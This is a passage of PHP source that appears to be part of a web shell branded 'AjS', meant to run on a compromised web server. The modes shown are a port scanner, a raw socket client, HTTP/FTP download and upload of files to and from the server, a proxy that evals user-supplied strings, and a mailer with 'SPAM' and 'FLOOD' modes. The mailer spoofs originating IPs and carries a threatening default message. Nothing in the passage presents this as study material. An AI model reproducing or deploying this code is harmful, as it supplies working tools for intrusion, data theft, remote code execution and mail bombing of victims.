                32776 => 'rpc.spray',
                32779 => 'rpc.cmsd',
                38036 => 'timestep',
                40193 => 'Novell',
                41524 => 'arcserve discovery'
            );
        
        if (isset($_GET['ajparam'])) {
            echo "\n" . '<table><tr><td class=listing colspan=2><h2>#Scan main will scan these ' . count($DEF_PORTS) . ' ports:</td></tr>';
            $INDEXES = array_keys($DEF_PORTS);
            for ($i = 0; $i < count($INDEXES); $i++)
                echo "\n" . '<tr><td width=40 class=listing style="text-align:right;">' . $INDEXES[$i] . '</td><td class=listing>' . $DEF_PORTS[$INDEXES[$i]] . '</td></tr>';
            echo "\n" . '</table>';
            die();
        }
        
        if (isset($_POST['ajportscan'])) {
            $OKAY_PORTS = 0;
            $TOSCAN     = array();
            
            if ($_POST['ajportscan']['ports'] == '#default')
                $TOSCAN = array_keys($DEF_PORTS);
            else {
                $_POST['ajportscan']['ports'] = explode(',', $_POST['ajportscan']['ports']);
                for ($i = 0; $i < count($_POST['ajportscan']['ports']); $i++) {
                    $_POST['ajportscan']['ports'][$i] = explode('-', $_POST['ajportscan']['ports'][$i]);
                    if (count($_POST['ajportscan']['ports'][$i]) == 1)
                        $TOSCAN[] = $_POST['ajportscan']['ports'][$i][0];
                    else
                        $TOSCAN += range($_POST['ajportscan']['ports'][$i][0], $_POST['ajportscan']['ports'][$i][1]);
                    $_POST['ajportscan']['ports'][$i] = implode('-', $_POST['ajportscan']['ports'][$i]);
                }
                $_POST['ajportscan']['ports'] = implode(',', $_POST['ajportscan']['ports']);
            }
            
            echo "\n" . '<table><tr><td colspan=2><font class="highlight_txt">Opened ports:</td></tr>';
            list($usec, $sec) = explode(' ', microtime());
            $start = (float) $usec + (float) $sec;
            for ($i = 0; $i < count($TOSCAN); $i++) {
                $cur_port =& $TOSCAN[$i];
                $fp = @fsockopen($_POST['ajportscan']['host'], $cur_port, $e, $e, (float) $_POST['ajportscan']['timeout']);
                if ($fp) {
                    $OKAY_PORTS++;
                    $port_name = '';
                    if (isset($DEF_PORTS[$cur_port]))
                        $port_name = $DEF_PORTS[$cur_port];
                    echo "\n" . '<tr><td width=50 class=listing style="text-align:right;">' . $cur_port . '</td><td class=listing>' . $port_name . '</td><td class=listing>' . getservbyport($cur_port, 'tcp') . '</td></tr>';
                }
            }
            list($usec, $sec) = explode(' ', microtime());
            $end = (float) $usec + (float) $sec;
            
            echo "\n" . '</table>';
            echo "\n" . '<font class="highlight_txt">Scanned ' . count($TOSCAN) . ', ' . $OKAY_PORTS . ' opened. Time: ' . ($end - $start) . '</font>';
            echo "\n" . '<br><hr>' . "\n";
        }
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table border=0>' . '<tr>' . '<td colspan=2>' . '<input type=text name="ajportscan[host]" value="' . ((isset($_POST['ajportscan']['host'])) ? $_POST['ajportscan']['host'] . '"' : '127.0.0.1"') . ' SIZE=30>' . '<input type=text name="ajportscan[timeout]" value="' . ((isset($_POST['ajportscan']['timeout'])) ? $_POST['ajportscan']['timeout'] . '"' : '0.1"') . ' SIZE=10>' . '</tr><tr>' . '<td><textarea name="ajportscan[ports]" rows=3 cols=50>' . ((isset($_POST['ajportscan']['ports'])) ? $_POST['ajportscan']['ports'] : '21-25,35,80,3306') . '</textarea>' . '</td><td>' . '<input type=checkbox name="ajportscan[ports]" value="#default"><a ' . AjDesign_DrawBubbleBox('', 'To learn out what "main ports" are, click here', 300) . ' href="' . AjURL('kill', 'ajparam') . '&ajparam=main_legend">#Scan main</a>' . '<br><input type=submit value="Scan" class="submit" style="width:100pt;">' . '</tr></table></form>';
        
        break;
    
    ########
    ########   Raw s0cket
    ########
    case 'SOCK':
        $DEFQUERY = AjHTTPMakeHeaders('GET', '/index.php?get=q&get2=d', 'www.microsoft.com', 'AjS Browser', 'http://referer.com/', array(
            'post_val' => 'Yeap'
        ), array(
            'cookiename' => 'val'
        ));
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table width=100% cellspacing=0 celpadding=0>';
        echo "\n" . '<tr><td class=linelisting colspan=2 width=100%><input type=text name="ajsock_host" value="' . ((isset($_POST['ajsock_host']) ? $_POST['ajsock_host'] : 'www.microsoft.com')) . '" style="width:100%;">';
        echo "\n" . '</td><td class=linelisting><nobr><input type=text name="ajsock_port" value="' . ((isset($_POST['ajsock_port']) ? $_POST['ajsock_port'] : '80')) . '" SIZE=10>' . ' timeout <input type=text name="ajsock_timeout" value="' . ((isset($_POST['ajsock_timeout']) ? $_POST['ajsock_timeout'] : '1.0')) . '" SIZE=4></td></tr>';
        echo "\n" . '<tr><td class=linelisting colspan=3>' . '<textarea ROWS=15 name="ajsock_request" style="width:100%;">' . ((isset($_POST['ajsock_request']) ? $_POST['ajsock_request'] : $DEFQUERY)) . '</textarea>' . '</td></tr>';
        echo "\n" . '<tr>' . '<td class=linelisting width=50pt><input type=radio name="ajsock_type" value="HTML" ' . ((isset($_POST['ajsock_type']) ? (($_POST['ajsock_type'] == 'HTML') ? 'CHECKED' : '') : 'CHECKED')) . '>HTML</td>' . '<td class=linelisting width=50pt><input type=radio name="ajsock_type" value="TEXT" ' . ((isset($_POST['ajsock_type']) ? (($_POST['ajsock_type'] == 'TEXT') ? 'CHECKED' : '') : '')) . '>TEXT</td>' . '<td class=linelisting width=100%><div align=right><input type=submit class=submit value="Send" style="width:100pt;height:20pt;"></td>' . '</tr>';
        echo "\n" . '</table>';
        
        if (!isset($_POST['ajsock_host'], $_POST['ajsock_port'], $_POST['ajsock_timeout'], $_POST['ajsock_request'], $_POST['ajsock_type']))
            die();
        
        echo "\n" . '<table width=100% cellspacing=0 celpadding=0>';
        echo "\n" . '<tr><td class=listing><pre><font class=highlight_txt>' . $_POST['ajsock_request'] . '</font></pre></td></tr>';
        echo "\n\n\n" . '<tr><td class=listing>';
        
        $fp = @fsockopen($_POST['ajsock_host'], $_POST['ajsock_port'], $errno, $errstr, (float) $_POST['ajsock_timeout']);
        if (!$fp)
            die(AjError('Sock #' . $errno . ' : ' . $errstr));
        
        if ($_POST['ajsock_type'] == 'TEXT')
            echo '<plaintext>';
        
        if (!empty($_POST['ajsock_request']))
            fputs($fp, $_POST['ajsock_request']);
        $ret = '';
        while (!feof($fp))
            $ret .= fgets($fp, 4096);
        fclose($fp);
        
        if ($_POST['ajsock_type'] == 'HTML')
            $headers_over_place = strpos($ret, "\r\n\r\n");
        else
            $headers_over_place = false;
        
        if ($headers_over_place === false)
            echo $ret;
        else
            echo '<pre>' . substr($ret, 0, $headers_over_place) . '</pre><br><hr><br>' . substr($ret, $headers_over_place);
        
        if ($_POST['ajsock_type'] == 'HTML')
            echo "\n" . '</td></tr></table>';
        
        break;
    
    ########
    ########   FTP, HTTP file transfers
    ########
	
    case 'FTP':
        echo "\n" . '<table align=center width=100%><col span=3 align=right width=33%><tr><td align=center><font class="highlight_txt"><b>HTTP Download</td><td align=center><font class="highlight_txt"><b>FTP Download</td><td align=center><font class="highlight_txt"><b>FTP Upload</td></tr>';
        echo "\n" . '<tr><td>';
        echo "\n\t" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n\t" . '<input type=text name="AjFTP_HTTP" value="http://" style="width:100%;">';
        echo "\n\t" . '<input type=text name="AjFTP_FileTO" value="' . ((isset($_GET['ajdir']) ? $_GET['ajdir'] : AjFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))) . '/file.txt" style="width:100%;">';
        echo "\n\t" . '<input type=submit value="GET!" style="width:150pt;" class=submit></form>';
        echo "\n" . '</td><td>';
        echo "\n\t" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n\t" . '<input type=text name="AjFTP_FTP" value="ftp.host.com[:21]" style="width:100%;">';
        echo "\n\t" . '<nobr><b>Login:<input type=text name="AjFTP_USER" value="Anonymous" style="width:40%;"> / <input type=text name="AjFTP_PASS" value="" style="width:40%;"></b></nobr>';
        echo "\n\t" . '<input type=text name="AjFTP_FileOF" value="get.txt" style="width:100%;">';
        echo "\n\t" . '<input type=text name="AjFTP_FileTO" value="' . ((isset($_GET['ajdir']) ? $_GET['ajdir'] : AjFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))) . '/" style="width:100%;">';
        echo "\n\t" . '<br><nobr><input type=checkbox name="AjFTP_File_BINARY" value="YES">Enable binary mode</nobr>';
        echo "\n\t" . '<input type=submit name="AjFTP_DWN" value="Download!" style="width:150pt;" class=submit></form>';
        echo "\n" . '</td><td>';
       
        echo "\n\t" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n\t" . '<input type=text name="AjFTP_FTP" value="ftp.host.com[:21]" style="width:100%;">';
        echo "\n\t" . '<nobr><b>Login:<input type=text name="AjFTP_USER" value="Anonymous" style="width:40%;"> / <input type=text name="AjFTP_PASS" value="" style="width:40%;"></b></nobr>';
        echo "\n\t" . '<input type=text name="AjFTP_FileOF" value="' . ((isset($_GET['ajdir']) ? $_GET['ajdir'] : AjFileOkaySlashes(realpath($GLOB['FILES']['CurDIR'])))) . '/file.txt' . '" style="width:100%;">';
        echo "\n\t" . '<input type=text name="AjFTP_FileTO" value="put.txt" style="width:100%;">';
        echo "\n\t" . '<br><nobr><input type=checkbox name="AjFTP_File_BINARY" value="YES">Enable binary mode</nobr>';
        echo "\n\t" . '<input type=submit name="AjFTP_UPL" value="Upload!" style="width:150pt;" class=submit></form>';
        echo "\n" . '</td></tr></table>';
        
        if (isset($_POST['AjFTP_HTTP'])) {
            $URLPARSED = parse_url($_POST['AjFTP_HTTP']);
            $request   = AjHTTPMakeHeaders('GET', $URLPARSED['path'] . '?' . $URLPARSED['query'], $URLPARSED['host']);
            if (!($f = @fsockopen($URLPARSED['host'], (empty($URLPARSED['port'])) ? 80 : $URLPARSED['port'], $errno, $errstr, 10)))
                die(AjError('Sock #' . $errno . ' : ' . $errstr));
            fputs($f, $request);
            
            $GETFILE = '';
            while (!feof($f))
                $GETFILE .= fgets($f, 4096);
            fclose($f);
            
            AjFiles_UploadHere($_POST['AjFTP_FileTO'], '', $GETFILE);
        }
        
        if (isset($_POST['AjFTP_DWN']) OR isset($_POST['AjFTP_UPL'])) {
            $AjFTP_SERV = explode(':', $_POST['AjFTP_FTP']);
            if (empty($AjFTP_SERV[1])) {
                $AjFTP_SERV = $AjFTP_SERV[0];
                $AjFTP_PORT = 21;
            } else {
                $AjFTP_SERV = $AjFTP_SERV[0];
                $AjFTP_PORT = (int) $AjFTP_SERV[1];
            }
            if (!($FTP = ftp_connect($AjFTP_SERV, $AjFTP_PORT, 10)))
                die(AjError('No connection'));
            if (!ftp_login($FTP, $_POST['AjFTP_USER'], $_POST['AjFTP_PASS']))
                die(AjError('Login failed'));
            if (isset($_POST['AjFTP_UPL']))
                if (!ftp_put($FTP, $_POST['AjFTP_FileTO'], $_POST['AjFTP_FileOF'], (isset($_POST['AjFTP_File_BINARY'])) ? FTP_BINARY : FTP_ASCII))
                    die(AjError('Failed to upload'));
                else
                    echo 'Upload OK';
            if (isset($_POST['AjFTP_DWN']))
                if (!ftp_get($FTP, $_POST['AjFTP_FileTO'], $_POST['AjFTP_FileOF'], (isset($_POST['AjFTP_File_BINARY'])) ? FTP_BINARY : FTP_ASCII))
                    die(AjError('Failed to download'));
                else
                    echo 'Download OK';
            ftp_close($FTP);
        }
        
        break;
    
    ########
    ########   HTTP Proxy
    ########
    case 'PROX':
        echo "\n\t" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table width=100% cellspacing=0>';
        echo "\n" . '<tr><td width=100pt class=linelisting>URL</td><td><input type=text name="AjProx_Url" value="' . (isset($_POST['AjProx_Url']) ? $_POST['AjProx_Url'] : 'http://www.microsoft.com:80/index.php?get=q&get2=d') . '" style="width:100%;"></td></tr>';
        echo "\n" . '<tr><td width=100pt colspan=2 class=linelisting><nobr>Browser <input type=text name="AjProx_Brw" value="' . (isset($_POST['AjProx_Brw']) ? $_POST['AjProx_Brw'] : 'AjS Browser') . '" style="width:40%;">' . ' Referer <input type=text name="AjProx_Ref" value="' . (isset($_POST['AjProx_Ref']) ? $_POST['AjProx_Ref'] : 'http://www.ref.ru/') . '" style="width:40%;"></td></tr>';
        echo "\n" . '<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><td><input type=text name="AjProx_PST" value="' . (isset($_POST['AjProx_PST']) ? $_POST['AjProx_PST'] : 'array(\'post_val\' => \'Yeap\')') . '" style="width:100%;"></td></tr>';
        echo "\n" . '<tr><td width=100pt class=linelisting><nobr>COOKIES (php eval)</td><td><input type=text name="AjProx_CKI" value="' . (isset($_POST['AjProx_CKI']) ? $_POST['AjProx_CKI'] : 'array(\'cookiename\' => \'val\')') . '" style="width:100%;"></td></tr>';
        echo "\n" . '<tr><td colspan=2><input type=submit value="Go" class=submit style="width:100%;">';
        echo "\n" . '</td></tr></table></form>';
        
        if (!isset($_POST['AjProx_Url']))
            die();
        
        echo str_repeat("\n", 10) . '<!-- AjS Proxy Browser -->' . "\n\n";
        
        if (empty($_POST['AjProx_PST']))
            $_POST['AjProx_PST'] = array();
        else {
            if (eval('$_POST[\'AjProx_PST\']=' . $_POST['AjProx_PST'] . ';') === FALSE)
                $_POST['AjProx_PST'] = array();
        }
        if (empty($_POST['AjProx_CKI']))
            $_POST['AjProx_CKI'] = array();
        else {
            if (eval('$_POST[\'AjProx_CKI\']=' . $_POST['AjProx_CKI'] . ';') === FALSE)
                $_POST['AjProx_CKI'] = array();
        }
        
        $URLPARSED = parse_url($_POST['AjProx_Url']);
        $request   = AjHTTPMakeHeaders('GET', (empty($URLPARSED['path']) ? '/' : $URLPARSED['path']) . (!empty($URLPARSED['query']) ? '?' . $URLPARSED['query'] : ''), $URLPARSED['host'], $_POST['AjProx_Brw'], $_POST['AjProx_Ref'], $_POST['AjProx_PST'], $_POST['AjProx_CKI']);
        if (!($f = @fsockopen($URLPARSED['host'], (empty($URLPARSED['port'])) ? 80 : $URLPARSED['port'], $errno, $errstr, 10)))
            die(AjError('Sock #' . $errno . ' : ' . $errstr));
        fputs($f, $request);
        
        $RET = '';
        while (!feof($f))
            $RET .= fgets($f, 4096);
        fclose($f);
        
        echo "\n" . '<table width=100% border=0><tr><td>';
        $headers_over_place = strpos($RET, "\r\n\r\n");
        if ($headers_over_place === FALSE)
            echo $RET;
        else
            echo '<pre><font class=highlight_txt>' . substr($RET, 0, $headers_over_place) . '</font></pre><br><hr><br>' . substr($RET, $headers_over_place);
        echo str_repeat("\n", 10) . '</td></tr></table>';
        break;
    
    ########
    ########   MAIL
    ########
    case 'MAIL':
        if (!isset($_GET['ajparam'])) {
            echo '';
            echo "\n" . '<form action="' . AjURL('kill', '') . '" method=GET style="display:inline;">';
            AjGETinForm('leave', '');
            echo "\n" . '<input type=submit name="ajparam" value="SPAM" style="position: absolute; width: 30%; left: 10%;">' . '<font class=highlight_txt style="position:absolute;left:46.5%;">: MAIL mode :</font>' . '<input type=submit name="ajparam" value="FLOOD" style="position: absolute; width: 30%; right: 10%;">';
            echo "\n" . '</form>';
            die();
        }
        
        if (ini_get('sendmail_path') == '')
            AjWarning('php.ini "sendmail_path" is empty! (' . var_export(ini_get('sendmail_path'), true) . ')');
        echo "\n\t" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table width=100% cellspacing=0 width=90% align=center><col width=100pt>';
        if ($_GET['ajparam'] == 'FLOOD') {
            echo "\n" . '<tr><td class=linelisting><b>TO: </td><td><input type=text name="AjMailer_TO" style="width:100%;" value="' . ((empty($_POST['AjMailer_TO'])) ? 'tristam@mail.ru' : $_POST['AjMailer_TO']) . '"></td></tr>';
            echo "\n" . '<tr><td class=linelisting><b>NUM FLOOD: </td><td><input type=text name="AjMailer_NUM" value="' . ((empty($_POST['AjMailer_NUM'])) ? '1000' : $_POST['AjMailer_NUM']) . '" SIZE=10></td></tr>';
        } else
            echo "\n" . '<tr><td class=linelisting><b>TO: </td><td><textarea name="AjMailer_TO" rows=10 style="width:100%;">' . ((empty($_POST['AjMailer_TO'])) ? 'tristam@mail.ru' . "\n" . 'billy@microsoft.com' : $_POST['AjMailer_TO']) . '</textarea></td></tr>';
        echo "\n" . '<tr><td class=linelisting><b>FROM: </td><td><input type=text name="AjMailer_FROM" value="' . ((empty($_POST['AjMailer_FROM'])) ? 'AjS <admin@' . $_SERVER['HTTP_HOST'] : $_POST['AjMailer_FROM']) . '>" style="width:100%;"></td></tr>';
        echo "\n" . '<tr><td class=linelisting><b>SUBJ: </td><td><input type=text name="AjMailer_SUBJ" style="width:100%;" value="' . ((empty($_POST['AjMailer_SUBJ'])) ? 'Look here, man...' : $_POST['AjMailer_SUBJ']) . '"></td></tr>';
        echo "\n" . '<tr><td class=linelisting><b>MSG: </td><td><textarea name="AjMailer_MSG" rows=5 style="width:100%;">' . ((empty($_POST['AjMailer_MSG'])) ? '<html><body><b>Wanna be butchered?' : $_POST['AjMailer_MSG']) . '</textarea></td></tr>';
        echo "\n" . '<tr><td class=linelisting colspan=2><div align=center><input type=submit Value="' . $_GET['ajparam'] . '" class=submit style="width:70%;"></tr>';
        echo "\n" . '</td></table></form>';
        
        if (!isset($_POST['AjMailer_TO']))
            die();
        
        $HEADERS = '';
        $HEADERS .= 'MIME-Version: 1.0' . "\r\n";
        $HEADERS .= 'Content-type: text/html;' . "\r\n";
        $HEADERS .= 'To: %%TO%%' . "\r\n";
        $HEADERS .= 'From: ' . $_POST['AjMailer_FROM'] . "\r\n";
        $HEADERS .= 'X-Originating-IP: [%%IP%%]' . "\r\n";
        $HEADERS .= 'X-Mailer: AjS v' . $GLOB['REMOTE']['Ver'] . ' Mailer' . "\r\n";
        $HEADERS .= 'Message-Id: <%%ID%%>';
        
        if ($_GET['ajparam'] == 'FLOOD') {
            $NUM   = $_POST['AjMailer_NUM'];
            $MAILS = array(
                $_POST['AjMailer_TO']
            );
        } else {
            $MAILS = explode("\n", str_replace("\r", '', $_POST['AjMailer_TO']));
            $NUM   = 1;
        }
        
        function AjMail($t, $s, $m, $h)
        {
            echo "\n\n\n<br><br><br>" . $t . "\n<br>" . $s . "\n<br>" . $m . "\n<br>" . $h;
        }
        
        $RESULTS[] = array();
        
        for ($n = 0; $n < $NUM; $n++)
            for ($m = 0; $m < count($MAILS); $m++)
                $RESULTS[] = (int) mail($MAILS[$m], $_POST['AjMailer_SUBJ'], $_POST['AjMailer_MSG'], str_replace(array(
                    '%%TO%%',
                    '%%IP%%',
                    '%%ID%%'
                ), array(
                    '<' . $MAILS[$m] . '>',
                    long2ip(mt_rand(0, pow(2, 31))),
                    md5($n . $m . AjRandomChars(3) . time())
                ), $HEADERS));
        
        echo "\n\n" . '<br><br>' . array_sum($RESULTS) . ' mails sent (' . ((100 * array_sum($RESULTS)) / ($NUM * (count($MAILS)))) . '% okay)';
        break;
}


if (substr($_GET['ajmode'], 0, 2) == 'F_') {
    /* file actions */
    echo "\n\n" . '<br><br>' . '<a href="' . AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajfile'])). '">[Go DIR]</a>';
}


if ($AJGLOBALVARS)
    echo "\n\n\n" . '</TD></TR></TABLE>';

echo '</body></html>';